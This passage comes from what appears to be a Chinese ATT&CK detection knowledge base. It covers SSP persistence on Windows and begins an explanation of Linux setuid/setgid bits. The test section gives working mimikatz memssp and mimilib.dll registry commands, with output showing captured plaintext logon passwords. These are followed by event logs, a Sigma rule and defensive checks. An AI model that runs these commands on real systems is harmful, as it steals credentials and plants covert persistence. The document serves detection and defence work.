Interface\uff0c\u5b89\u5168\u652f\u6301\u63d0\u4f9b\u7a0b\u5e8f\u63a5\u53e3\uff09\u662fwindows\u64cd\u4f5c\u7cfb\u7edf\u5728\u6267\u884c\u8ba4\u8bc1\u64cd\u4f5c\u65f6\u4f7f\u7528\u7684API\u63a5\u53e3\u3002\u53ef\u4ee5\u8bf4SSPI\u5c31\u662fSSP\u7684API\u63a5\u53e3\u3002</p> <p>\u5982\u679c\u83b7\u5f97\u76ee\u6807\u7cfb\u7edfsystem\u6743\u9650\uff0c\u53ef\u4ee5\u4f7f\u7528\u8be5\u65b9\u6cd5\u8fdb\u884c\u6301\u4e45\u5316\u64cd\u4f5c\u3002\u5176\u4e3b\u8981\u539f\u7406\u662f\uff1aLSA\uff08Local Security Authority\uff09\u7528\u4e8e\u8eab\u4efd\u9a8c\u8bc1\uff1blsass.exe\u4f5c\u4e3awindows\u7684\u7cfb\u7edf\u8fdb\u7a0b\uff0c\u7528\u4e8e\u672c\u5730\u5b89\u5168\u548c\u767b\u5f55\u7b56\u7565\uff1b\u5728\u7cfb\u7edf\u542f\u52a8\u65f6\uff0cSSP\u5c06\u88ab\u52a0\u8f7d\u5230lsass.exe \u8fdb\u7a0b\u4e2d\u3002\u4f46\u662f\uff0c\u5047\u5982\u653b\u51fb\u8005\u5bf9LSA\u8fdb\u884c\u4e86\u6269\u5c55\uff0c\u81ea\u5b9a\u4e49\u4e86\u6076\u610f\u7684DLL\u6587\u4ef6\uff0c\u5728\u7cfb\u7edf\u542f\u52a8\u65f6\u5c06\u5176\u52a0\u8f7d\u5230lsass.exe\u8fdb\u7a0b\u4e2d\uff0c\u5c31\u80fd\u591f\u83b7\u53d6lsass.exe\u8fdb\u7a0b\u4e2d\u7684\u660e\u6587\u5bc6\u7801\u3002\u8fd9\u6837\u5373\u4f7f\u7528\u6237\u66f4\u6539\u5bc6\u7801\u5e76\u91cd\u65b0\u767b\u5f55\uff0c\u653b\u51fb\u8005\u4f9d\u7136\u53ef\u4ee5\u83b7\u5f97\u8be5\u8d26\u53f7\u7684\u65b0\u5bc6\u7801\u3002</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1547-005-win-SSP%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows\u5b89\u5168\u65e5\u5fd7</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1547-005-win-SSP%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":""},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1547-005-win-SSP%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#_4","title":"\u65b9\u6cd5\u4e00","text":"<p>\u4f7f\u7528mimikatz\u5c06\u4f2a\u9020\u7684SSP\u6ce8\u5165\u5185\u5b58\uff0c\u8fd9\u6837\u505a\u4e0d\u4f1a\u5728\u7cfb\u7edf\u4e2d\u7559\u4e0b\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u4f46\u5982\u679c\u57df\u63a7\u5236\u5668\u91cd\u542f\uff0c\u88ab\u6ce8\u5165\u5185\u5b58\u7684\u4f2a\u9020\u7684SSP\u5c06\u4f1a\u4e22\u5931\u3002</p> <pre><code>mimikatz.exe \"privilege::debug\" \"misc::memssp\" exit\n</code></pre> <pre><code>C:\\Users\\Administrator\\Desktop\\mimikatz_trunk\\x64&gt;mimikatz.exe \"privilege::debug\n\" \"misc::memssp\" exit\n\n  .#####.   mimikatz 2.1.1 (x64) built on Apr  9 2017 23:24:20\n .## ^ ##.  \"A La Vie, A L'Amour\"\n ## / \\ ##  /* * *\n ## \\ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)\n  '#####'                                     with 21 modules * * */\n\nmimikatz(commandline) # privilege::debug\nPrivilege '20' OK\n\nmimikatz(commandline) # misc::memssp\nInjected =)\n\nmimikatz(commandline) # exit\nBye!\n</code></pre> <p>\u6ce8\u9500\u5f53\u524d\u7528\u6237\u91cd\u65b0\u767b\u5f55\uff0c\u5373\u53ef\u83b7\u53d6\u660e\u6587\u5bc6\u7801\uff0c\u5bc6\u7801\u5b58\u50a8\u5728\u65e5\u5fd7\u6587\u4ef6C:\\Windows\\system32\\mimilsa.log\u4e2d\u3002</p> <pre><code>type C:\\Windows\\system32\\mimilsa.log\n</code></pre> <pre><code>C:\\Users\\Administrator&gt;type C:\\Windows\\system32\\mimilsa.log\n[00000000:00063a51] DC\\Administrator    admin.098\n</code></pre>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1547-005-win-SSP%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#_5","title":"\u65b9\u6cd5\u4e8c","text":"<p>\u5c06mimikatz\u4e2d\u7684mimilib.dll \u653e\u5230\u7cfb\u7edf\u7684C:\\Windows\\system32\u76ee\u5f55\u4e0b\uff08DLL\u7684\u4f4d\u6570\u9700\u8981\u4e0ewindows\u4f4d\u6570\u76f8\u540c\uff09\uff0c\u5e76\u5c06mimilib.dll\u6dfb\u52a0\u5230\u6ce8\u518c\u8868\u4e2d\uff0c\u4f7f\u7528\u6b64\u65b9\u6cd5\u5373\u4f7f\u7cfb\u7edf\u91cd\u542f\uff0c\u4e5f\u4e0d\u4f1a\u5f71\u54cd\u5230\u6301\u4e45\u5316\u7684\u6548\u679c\u3002</p> <pre><code>copy mimilib.dll %systemroot%\\system32\nreg query hklm\\system\\currentcontrolset\\control\\lsa\\ /v \"Security Packages\"\nreg add \"hklm\\system\\currentcontrolset\\control\\lsa\\\" /v \"Security Packages\" /d \"kerberos\\0msv1_0\\0schannel\\0wdigest\\0tspkg\\0pku2u\\0mimilib\" /t REG_MULTI_SZ\n</code></pre> <pre><code>C:\\Users\\Administrator\\Desktop\\mimikatz_trunk\\x64&gt;copy mimilib.dll %systemroot%\\\nsystem32\n\u5df2\u590d\u5236         1 \u4e2a\u6587\u4ef6\u3002\n\nC:\\Users\\Administrator\\Desktop\\mimikatz_trunk\\x64&gt;reg query hklm\\system\\currentc\nontrolset\\control\\lsa\\ /v \"Security Packages\"\n\nHKEY_LOCAL_MACHINE\\system\\currentcontrolset\\control\\lsa\n    Security Packages    REG_MULTI_SZ    kerberos\\0msv1_0\\0schannel\\0wdigest\\0ts\npkg\\0pku2u\n</code></pre> <p>\u6ce8\u610f\uff1a\u6700\u540e\u4e00\u6b65\u4fee\u6539\u6ce8\u518c\u8868\u9700\u8981\u5728powershell\u547d\u4ee4\u884c\u4e0b\u64cd\u4f5c\uff0ccmd\u4e0b\u53ef\u80fd\u4f1a\u62a5\u9519\u3002</p> <pre><code>C:\\Users\\Administrator\\Desktop\\mimikatz_trunk\\x64&gt;reg add \"hklm\\system\\currentcontrolset\\control\\lsa\\\" /v \"Security Packages\" /d \"kerberos\\0msv1_0\\0schannel\\0wdigest\\0tspkg\\0pku2u\\0mimilib\" /t REG_MULTI_SZ\n\u9519\u8bef: \u65e0\u6548\u8bed\u6cd5\u3002\n\u952e\u5165 \"REG ADD /?\" \u4e86\u89e3\u7528\u6cd5\u4fe1\u606f\u3002\n</code></pre> <pre><code>PS C:\\Users\\Administrator&gt; reg add \"hklm\\system\\currentcontrolset\\control\\lsa\\\" /v \"Security Packages\" /d \"kerberos\\0msv\n1_0\\0schannel\\0wdigest\\0tspkg\\0pku2u\\0mimilib\" /t REG_MULTI_SZ\n\u503c Security Packages \u5df2\u5b58\u5728\uff0c\u8981\u8986\u76d6\u5417(Yes/No)? y\n\u64cd\u4f5c\u6210\u529f\u5b8c\u6210\u3002\n</code></pre> <p>\u67e5\u770b\u6ce8\u518c\u8868 hklm\\system\\currentcontrolset\\control\\lsa\\Security Packages\u9879\u7684\u503c\u3002</p> <pre><code>C:\\Users\\Administrator\\Desktop\\mimikatz_trunk\\x64&gt;reg query hklm\\system\\currentc\nontrolset\\control\\lsa\\ /v \"Security Packages\"\n\nHKEY_LOCAL_MACHINE\\system\\currentcontrolset\\control\\lsa\n    Security Packages    REG_MULTI_SZ    kerberos\\0msv1_0\\0schannel\\0wdigest\\0ts\npkg\\0pku2u\\0mimilib\n</code></pre> <p>\u7cfb\u7edf\u91cd\u542f\u540e\uff0c\u82e5dll\u88ab\u6210\u529f\u52a0\u8f7d\uff0c\u7528\u6237\u5728\u767b\u5f55\u65f6\u8f93\u5165\u7684\u8d26\u53f7\u548c\u5bc6\u7801\u660e\u6587\u5c31\u4f1a\u88ab\u8bb0\u5f55\u5728C:\\Windows\\system32\\kiwissp.log\u4e2d\u3002</p> <pre><code>type C:\\Windows\\system32\\kiwissp.log\n</code></pre> <pre><code>C:\\Users\\Administrator&gt;type C:\\Windows\\system32\\kiwissp.log\n[00000000:000003e7] [00000002] WORKGROUP\\DC$ (DC$)\n[00000000:00049cd0] [00000002] DC\\Administrator (Administrator) admin.098\n[00000000:000003e5] [00000005] \\ (LOCAL SERVICE)\n</code></pre>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1547-005-win-SSP%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#_6","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u5efa\u8bae\u5728windows server 2008\uff08\u542b2008\uff09\u4ee5\u4e0b\u7248\u672c\u5b89\u88c5\u90e8\u7f72sysmon\uff0c\u8bb0\u5f55\u8fdb\u7a0b\u540d\u79f0\u3001\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u65b9\u4fbf\u6eaf\u6e90\u5206\u6790\uff1b</p> <p>\u5efa\u8bae\u5728windows server 2008\u4ee5\u4e0a\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u5f00\u542f\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa\u7b56\u7565\uff0c\u8bb0\u5f55\u8fdb\u7a0b\u540d\u79f0\u3001\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u65b9\u4fbf\u6eaf\u6e90\u5206\u6790\u3002</p> <pre><code>#\u9488\u5bf9\u65b9\u6cd5\u4e8c\u7559\u75d5\n\nEVentID: 4656 #\u5df2\u8bf7\u6c42\u5230\u5bf9\u8c61\u7684\u53e5\u67c4\u3002\n\u5bf9\u8c61:\n\u5bf9\u8c61\u670d\u52a1\u5668: Security\n\u5bf9\u8c61\u7c7b\u578b: Key\n\u5bf9\u8c61\u540d: \\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WSMAN\n\u53e5\u67c4 ID: 0x508\n\n\u8fdb\u7a0b\u4fe1\u606f:\n\u8fdb\u7a0b ID: 0x748\n\u8fdb\u7a0b\u540d: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\n\u8bbf\u95ee\u8bf7\u6c42\u4fe1\u606f:\n\u4e8b\u52a1 ID: {00000000-0000-0000-0000-000000000000}\n\u8bbf\u95ee: READ_CONTROL\n      \u67e5\u8be2\u9879\u503c\n      \u679a\u4e3e\u5b50\u9879\n      \u5bf9\u9879\u7684\u6539\u52a8\u8fdb\u884c\u901a\u77e5\n\nEVentID: 4658 #\u5df2\u5173\u95ed\u5230\u5bf9\u8c61\u7684\u53e5\u67c4\u3002\n\u5bf9\u8c61:\n\u5bf9\u8c61\u670d\u52a1\u5668: Security\n\u53e5\u67c4 ID: 0x508\n\n\u8fdb\u7a0b\u4fe1\u606f:\n\u8fdb\u7a0b ID: 0xbd8\n\u8fdb\u7a0b\u540d: C:\\Windows\\System32\\Oobe.exe\n\nEVentID: 4688 #\u5df2\u521b\u5efa\u65b0\u8fdb\u7a0b\u3002\u5728\u9ad8\u7248\u672c\u7cfb\u7edf\u4e2d\u53ef\u8bb0\u5f55\u547d\u4ee4\u884c\u53c2\u6570\n\u8fdb\u7a0b\u4fe1\u606f:\n\u65b0\u8fdb\u7a0b ID: 0x5c8\n\u65b0\u8fdb\u7a0b\u540d: C:\\Windows\\System32\\reg.exe\n\u4ee4\u724c\u63d0\u5347\u7c7b\u578b: TokenElevationTypeDefault (1)\n\nEVentID: 4656 #\u5df2\u8bf7\u6c42\u5230\u5bf9\u8c61\u7684\u53e5\u67c4\u3002\n\u5bf9\u8c61:\n\u5bf9\u8c61\u670d\u52a1\u5668: Security\n\u5bf9\u8c61\u7c7b\u578b: Key\n\u5bf9\u8c61\u540d: \\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WSMAN\\Plugin\\Microsoft.ServerManager\n\u53e5\u67c4 ID: 0x694\n\n\u8fdb\u7a0b\u4fe1\u606f:\n\u8fdb\u7a0b ID: 0x864\n\u8fdb\u7a0b\u540d: C:\\Windows\\System32\\Oobe.exe\n\n\u8bbf\u95ee\u8bf7\u6c42\u4fe1\u606f:\n\u4e8b\u52a1 ID: {00000000-0000-0000-0000-000000000000}\n\u8bbf\u95ee: READ_CONTROL\n      \u67e5\u8be2\u9879\u503c\n      \u679a\u4e3e\u5b50\u9879\n      \u5bf9\u9879\u7684\u6539\u52a8\u8fdb\u884c\u901a\u77e5\n</code></pre>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1547-005-win-SSP%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#_7","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1547-005-win-SSP%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#sigma","title":"Sigma\u89c4\u5219","text":"<pre><code>title: \u6dfb\u52a0\u5230LSA\u914d\u7f6e\u7684\u5b89\u5168\u652f\u6301\u63d0\u4f9b\u7a0b\u5e8f\uff08SSP\uff09\nstatus: \u6d4b\u8bd5\u9636\u6bb5\ndescription: \u68c0\u6d4b\u5411\u6ce8\u518c\u8868\u6dfb\u52a0SSP\u3002\u5728\u91cd\u65b0\u542f\u52a8\u6216API\u8c03\u7528\u540e\uff0cSSP DLL\u53ef\u4ee5\u8bbf\u95ee\u5b58\u50a8\u5728Windows\u4e2d\u7684\u52a0\u5bc6\u5bc6\u7801\u548c\u660e\u6587\u5bc6\u7801\u3002\nreferences:\n    - https://attack.mitre.org/techniques/T1547/005/\n    - https://powersploit.readthedocs.io/en/latest/Persistence/Install-SSP/\ntags:\n    - attack.persistence\n    - attack.t1547\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection_registry:\n        EventID: 13 #\u521b\u5efa\u6ce8\u518c\u8868\u503c sysmon\u65e5\u5fd7\n        TargetObject:\n            - 'HKLM\\System\\CurrentControlSet\\Control\\Lsa\\Security Packages'\n            - 'HKLM\\System\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages'\n    exclusion_images:\n        - Image: C:\\Windows\\system32\\msiexec.exe\n        - Image: C:\\Windows\\syswow64\\MsiExec.exe\n    condition: selection_registry and not exclusion_images\nfalsepositives:\n    - \u4e0d\u592a\u53ef\u80fd\nlevel: \u5173\u952e\n</code></pre>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1547-005-win-SSP%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#_8","title":"\u5efa\u8bae","text":"<p>\u76d1\u63a7\u6ce8\u518c\u8868\u6765\u67e5\u770bSSP\u6ce8\u518c\u8868\u9879\u662f\u5426\u6709\u66f4\u6539\u3002\u76d1\u63a7LSA\u8fdb\u7a0b\u6765\u67e5\u770b\u662f\u5426\u6709\u52a8\u6001\u94fe\u63a5\u5e93\u52a0\u8f7d\u7684\u60c5\u51b5\u3002Windows 8.1\u548cWindows Server 2012 R2\u4e2d\uff0c\u5728\u6ce8\u518c\u8868\u9879HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File ExecutionOptions\\LSASS.exe\u4e2d\u8bbe\u7f6eAuditLevel\u00df=8\u6765\u52a0\u8f7d\u672a\u7b7e\u540d\u7684SSP\u52a8\u6001\u94fe\u63a5\u5e93\u5230LSA\u65f6\u4f1a\u751f\u6210\u4e8b\u4ef6\u3002</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1547-005-win-SSP%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#_9","title":"\u5b89\u5168\u9632\u5fa1\u63aa\u65bd","text":"<p>1.\u68c0\u67e5\u6ce8\u518c\u8868</p> <p>hklm\\system\\currentcontrolset\\control\\lsa\\Security Packages\u4f4d\u7f6e\u662f\u5426\u5b58\u5728\u53ef\u7591dll\u3002</p> <p>2.\u68c0\u6d4b%windir%\\System32\u662f\u5426\u6709\u53ef\u7591dll</p> <p>3.\u4f7f\u7528\u7b2c\u4e09\u65b9\u5de5\u5177 Autoruns \u68c0\u6d4bLSA\u4e2d\u662f\u5426\u5b58\u5728\u53ef\u7591dll\u3002</p> <p>Autoruns\u4e0b\u8f7d\uff1ahttps://docs.microsoft.com/zh-cn/sysinternals/downloads/autoruns</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1547-005-win-SSP%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#_10","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1547-005</p> <p>https://attack.mitre.org/techniques/T1547/005/</p> <p>AD\u57dfSSP\u6743\u9650\u7ef4\u6301\u4e0e\u5b89\u5168\u9632\u62a4</p> <p>https://xz.aliyun.com/t/7432</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1548-001-linux-Setuid%20and%20Setgid/","title":"T1548-001-linux-Setuid and Setgid","text":""},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1548-001-linux-Setuid%20and%20Setgid/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528setuid\u6216setgid\u4f4d\u6267\u884c\u5916\u58f3\u8f6c\u4e49\u6216\u5229\u7528\u5e94\u7528\u7a0b\u5e8f\u4e2d\u7684\u6f0f\u6d1e\u6765\u83b7\u53d6\u5728\u4e0d\u540c\u7528\u6237\u4e0a\u4e0b\u6587\u4e2d\u8fd0\u884c\u7684\u4ee3\u7801\u3002\u5728Linux\u6216macOS\u4e0a\uff0c\u5f53\u4e3a\u5e94\u7528\u7a0b\u5e8f\u8bbe\u7f6e\u4e86setuid\u6216setgid\u4f4d\u65f6\uff0c\u8be5\u5e94\u7528\u7a0b\u5e8f\u5c06\u5206\u522b\u4ee5\u62e5\u6709\u7528\u6237\u6216\u7ec4\u7684\u7279\u6743\u8fd0\u884c\u3002\u901a\u5e38\uff0c\u5e94\u7528\u7a0b\u5e8f\u662f\u5728\u5f53\u524d\u7528\u6237\u7684\u4e0a\u4e0b\u6587\u4e2d\u8fd0\u884c\u7684\uff0c\u800c\u4e0d\u7ba1\u54ea\u4e2a\u7528\u6237\u6216\u7ec4\u62e5\u6709\u8be5\u5e94\u7528\u7a0b\u5e8f\u3002\u4f46\u662f\uff0c\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u9700\u8981\u5728\u63d0\u5347\u6743\u9650\u7684\u4e0a\u4e0b\u6587\u4e2d\u6267\u884c\u7a0b\u5e8f\u624d\u80fd\u6b63\u5e38\u8fd0\u884c\uff0c\u4f46\u8fd0\u884c\u5b83\u4eec\u7684\u7528\u6237\u4e0d\u9700\u8981\u63d0\u5347\u6743\u9650\u3002</p> <p>\u4efb\u4f55\u7528\u6237\u90fd\u53ef\u4ee5\u4e3a\u81ea\u5df1\u7684\u5e94\u7528\u7a0b\u5e8f\u8bbe\u7f6esetuid\u6216setgid\u6807\u5fd7\uff0c\u800c\u4e0d\u5fc5\u5728sudoers\u6587\u4ef6\u4e2d\u521b\u5efa\u6761\u76ee\uff08\u5fc5\u987b\u7531root\u7528\u6237\u5b8c\u6210\uff09\u3002\u901a\u8fc7\u89c2\u770b\u6587\u4ef6\u5c5e\u6027\u65f6\uff0c\u8fd9\u4e9b\u4f4d\u7528\u201cs\u201d\u800c\u4e0d\u662f\u201cx\u201d\u8868\u793als -l\u3002\u8be5chmod\u7a0b\u5e8f\u80fd\u591f\u7ecf\u7531bitmasking\u8bbe\u7f6e\u8fd9\u4e9b\u4f4d\u4e0e\uff0cchmod 4777 [file]\u6216\u901a\u8fc7\u901f\u8bb0\u547d\u540d\uff0cchmod u+s [file]\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u5bf9\u81ea\u5df1\u7684\u6076\u610f\u8f6f\u4ef6\u4f7f\u7528\u6b64\u673a\u5236\uff0c\u4ee5\u786e\u4fdd\u4ed6\u4eec\u5c06\u6765\u80fd\u591f\u5728\u63d0\u5347\u7684\u73af\u5883\u4e2d\u6267\u884c\u3002</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1548-001-linux-Setuid%20and%20Setgid/#setuid-and-setgid","title":"\u5173\u4e8eSetuid and Setgid\u8be6\u89e3","text":"<p>\u6587\u4ef6\u6743\u9650\u7684\u673a\u5236\u662fLinux\u7cfb\u7edf\u7684\u4e00\u5927\u7279\u8272\uff0c\u5bf9\u4e8e\u521d\u5b66Linux\u7684\u4eba\u5bf9\u53ef\u8bfb\uff08r\uff09\u3001\u53ef\u5199\uff08w\uff09\u3001\u53ef\u6267\u884c\uff08x\uff09\u8fd9\u90fd\u662f\u6bd4\u8f83\u57fa\u672c\u7684\u6743\u9650\u3002\u4e00\u4e2a\u6587\u4ef6\u7684\u6743\u9650\u6709\u5341\u4e2a\u4f4d\uff0c\u5206\u4e3a\u4e09\u7ec4\u6765\u8868\u793a\u3002\u7b2c\u4e00\u4e2a\u4f4d\u4e3a\u4e00\u7ec4\uff0c\u8868\u793a\u6587\u4ef6\u7684\u7c7b\u578b\uff1a</p> <p>-\uff1a\u8868\u793a\u4e00\u822c\u6587\u4ef6</p> <p>d\uff1a\u8868\u793a\u76ee\u5f55\u6587\u4ef6</p> <p>l\uff1a\u8868\u793a\u94fe\u63a5\u6587\u4ef6</p> <p>b\uff1a\u8868\u793a\u5757\u8bbe\u5907</p> <p>c\uff1a\u8868\u793a\u5b57\u7b26\u8bbe\u5907</p> <p>p\uff1a\u8868\u793a\u7ba1\u9053</p> <p>s\uff1a\u8868\u793a\u5957\u63a5\u5b57</p> <p>\u4f46\u662fLinux\u8fd8\u6709\u4e09\u4e2a\u6bd4\u8f83\u7279\u6b8a\u7684\u6743\u9650\uff0c\u5206\u522b\u662f\uff1asetuid\uff0csetgid\uff0cstick bit \uff08\u7c98\u6ede\u4f4d\uff09\u3002</p> <p>setuid: \u8bbe\u7f6e\u4f7f\u6587\u4ef6\u5728\u6267\u884c\u9636\u6bb5\u5177\u6709\u6587\u4ef6\u6240\u6709\u8005\u7684\u6743\u9650. \u5178\u578b\u7684\u6587\u4ef6\u662f /usr/bin/passwd. \u5982\u679c\u4e00\u822c\u7528\u6237\u6267\u884c\u8be5\u6587\u4ef6, \u5219\u5728\u6267\u884c\u8fc7\u7a0b\u4e2d, \u8be5\u6587\u4ef6\u53ef\u4ee5\u83b7\u5f97root\u6743\u9650, \u4ece\u800c\u53ef\u4ee5\u66f4\u6539\u7528\u6237\u7684\u5bc6\u7801\u3002</p> <p>setgid: \u8be5\u6743\u9650\u53ea\u5bf9\u76ee\u5f55\u6709\u6548. \u76ee\u5f55\u88ab\u8bbe\u7f6e\u8be5\u4f4d\u540e, \u4efb\u4f55\u7528\u6237\u5728\u6b64\u76ee\u5f55\u4e0b\u521b\u5efa\u7684\u6587\u4ef6\u90fd\u5177\u6709\u548c\u8be5\u76ee\u5f55\u6240\u5c5e\u7684\u7ec4\u76f8\u540c\u7684\u7ec4\u3002</p> <p>stick bit: \u8be5\u4f4d\u53ef\u4ee5\u7406\u89e3\u4e3a\u9632\u5220\u9664\u4f4d. \u4e00\u4e2a\u6587\u4ef6\u662f\u5426\u53ef\u4ee5\u88ab\u67d0\u7528\u6237\u5220\u9664, \u4e3b\u8981\u53d6\u51b3\u4e8e\u8be5\u6587\u4ef6\u6240\u5c5e\u7684\u7ec4\u662f\u5426\u5bf9\u8be5\u7528\u6237\u5177\u6709\u5199\u6743\u9650. \u5982\u679c\u6ca1\u6709\u5199\u6743\u9650, \u5219\u8fd9\u4e2a\u76ee\u5f55\u4e0b\u7684\u6240\u6709\u6587\u4ef6\u90fd\u4e0d\u80fd\u88ab\u5220\u9664, \u540c\u65f6\u4e5f\u4e0d\u80fd\u6dfb\u52a0\u65b0\u7684\u6587\u4ef6. \u5982\u679c\u5e0c\u671b\u7528\u6237\u80fd\u591f\u6dfb\u52a0\u6587\u4ef6\u4f46\u540c\u65f6\u4e0d\u80fd\u5220\u9664\u6587\u4ef6, \u5219\u53ef\u4ee5\u5bf9\u6587\u4ef6\u4f7f\u7528stick bit\u4f4d. \u8bbe\u7f6e\u8be5\u4f4d\u540e, \u5c31\u7b97\u7528\u6237\u5bf9\u76ee\u5f55\u5177\u6709\u5199\u6743\u9650, \u4e5f\u4e0d\u80fd\u5220\u9664\u8be5\u6587\u4ef6\u3002</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1548-001-linux-Setuid%20and%20Setgid/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u64cd\u4f5c\u8fd9\u4e9b\u6807\u5fd7\u4e0e\u64cd\u4f5c\u6587\u4ef6\u6743\u9650\u7684\u547d\u4ee4\u662f\u4e00\u6837\u7684, \u90fd\u662f chmod. \u6709\u4e24\u79cd\u65b9\u6cd5\u6765\u64cd\u4f5c\uff1a</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1548-001-linux-Setuid%20and%20Setgid/#_2","title":"\u65b9\u6cd5\u4e00","text":"<p>chmod u+s xxx # \u8bbe\u7f6esetuid\u6743\u9650\uff0c\u52a0\u4e0asetuid\u6807\u5fd7(setuid \u53ea\u5bf9\u6587\u4ef6\u6709\u6548)</p> <p>chmod g+s xxx # \u8bbe\u7f6esetgid\u6743\u9650\uff0c\u52a0\u4e0asetgid\u6807\u5fd7 (setgid \u53ea\u5bf9\u76ee\u5f55\u6709\u6548)</p> <p>chmod o+t xxx # \u8bbe\u7f6estick bit\u6743\u9650\uff0c\u9488\u5bf9\u76ee\u5f55</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1548-001-linux-Setuid%20and%20Setgid/#_3","title":"\u65b9\u6cd5\u4e8c","text":"<p>\u91c7\u7528\u516b\u8fdb\u5236\u65b9\u5f0f. \u5bf9\u4e00\u822c\u6587\u4ef6\u901a\u8fc7\u4e09\u7ec4\u516b\u8fdb\u5236\u6570\u5b57\u6765\u7f6e\u6807\u5fd7, \u5982 666, 777, 644\u7b49. \u5982\u679c\u8bbe\u7f6e\u8fd9\u4e9b\u7279\u6b8a\u6807\u5fd7, \u5219\u5728\u8fd9\u7ec4</p> <p>\u6570\u5b57\u4e4b\u5916\u5916\u52a0\u4e00\u7ec4\u516b\u8fdb\u5236\u6570\u5b57. \u59824666, 2777\u7b49</p> <p>chmod 4775 xxx # \u8bbe\u7f6esetuid\u6743\u9650</p> <p>chmod 2775 xxx # \u8bbe\u7f6esetgid\u6743\u9650</p> <p>chmod 1775 xxx # \u8bbe\u7f6estick bit\u6743\u9650\uff0c\u9488\u5bf9\u76ee\u5f55</p> <p>\u5728\u8fd9\u91cc\u53ea\u8bb2\u7b2c\u4e00\u4f4d8\u8fdb\u5236\u4ee3\u8868\u6743\u9650</p> <p>0: \u4e0d\u8bbe\u7f6e\u7279\u6b8a\u6743\u9650</p> <p>1\uff1a\u53ea\u8bbe\u7f6esticky</p> <p>2\uff1a\u53ea\u8bbe\u7f6eSGID</p> <p>3\uff1a\u53ea\u8bbe\u7f6eSGID\u548csticky</p> <p>4\uff1a\u53ea\u8bbe\u7f6eSUID</p> <p>5\uff1a\u53ea\u8bbe\u7f6eSUID\u548csticky</p> <p>6\uff1a\u53ea\u8bbe\u7f6eSUID\u548cSGID</p> <p>7\uff1a\u8bbe\u7f6e3\u79cd\u6743\u9650</p> <p>\u8bbe\u7f6e\u5b8c\u8fd9\u4e9b\u6807\u5fd7\u540e, \u53ef\u4ee5\u7528 ls -l \u6765\u67e5\u770b. \u5982\u679c\u6709\u8fd9\u4e9b\u6807\u5fd7, \u5219\u4f1a\u5728\u539f\u6765\u7684\u6267\u884c\u6807\u5fd7\u4f4d\u7f6e\u4e0a\u663e\u793a\u3002\u90a3\u4e48\u539f\u6765\u7684\u6267\u884c\u6807\u5fd7x\u5230\u54ea\u91cc\u53bb\u4e86\u5462? \u7cfb\u7edf\u662f\u8fd9\u6837\u89c4\u5b9a\u7684, \u5982\u679c\u672c\u6765\u5728\u8be5\u4f4d\u4e0a\u6709x, \u5219\u8fd9\u4e9b\u7279\u6b8a\u6807\u5fd7\u663e\u793a\u4e3a\u5c0f\u5199\u5b57\u6bcd (s, s, t). \u5426\u5219, \u663e\u793a\u4e3a\u5927\u5199\u5b57\u6bcd (S, S, T)\u3002</p> 